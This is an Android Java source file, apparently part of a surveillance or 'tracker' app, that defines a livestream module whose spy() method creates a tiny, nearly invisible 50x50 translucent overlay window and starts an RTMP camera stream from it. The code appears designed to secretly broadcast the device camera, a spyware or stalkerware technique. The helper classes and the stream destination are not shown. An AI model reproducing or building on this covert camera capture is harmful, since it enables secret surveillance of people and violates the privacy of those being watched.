package net.datadeer.app.lifestream;

import android.content.Context;
import android.graphics.PixelFormat;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.pedro.rtplibrary.rtmp.RtmpCamera1;

import net.datadeer.app.DeerView;

class TrackerLifestream extends TrackerMethod {


    private static final String TAG = DeerView.TAG;

    public TrackerLifestream() {
        super("TrackerLivestream");
    }

    @Override
    protected void spy() {
        Log.d(TAG,"STARTING LIVESTREAM MODULE");
        WindowManager windowManager;
        SurfaceView surfaceView;
        windowManager = (WindowManager) getContext().getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(getContext());
        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
            Rtmp.Pointer<RtmpCamera1> p;
            @Override
            public void surfaceCreated(SurfaceHolder holder) {
                Log.d(TAG,"SURFACE CREATED");
                WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                        50, 50,
                        WindowManager.LayoutParams.TYPE_APPLICATION_PANEL,
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                        PixelFormat.TRANSLUCENT
                );
                layoutParams.gravity = Gravity.START | Gravity.TOP;
                windowManager.addView(surfaceView, layoutParams);
                p = Rtmp.init(getContext(),surfaceView);
            }
            @Override
            public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {
                Log.d(TAG,"SURFACE CHANGED "+width+"x"+height);
            }
            @Override
            public void surfaceDestroyed(SurfaceHolder holder) {
                Log.d(TAG,"SURFACE DESTROYED");
                Rtmp.stop(p.e);
            }
        });
    }
}
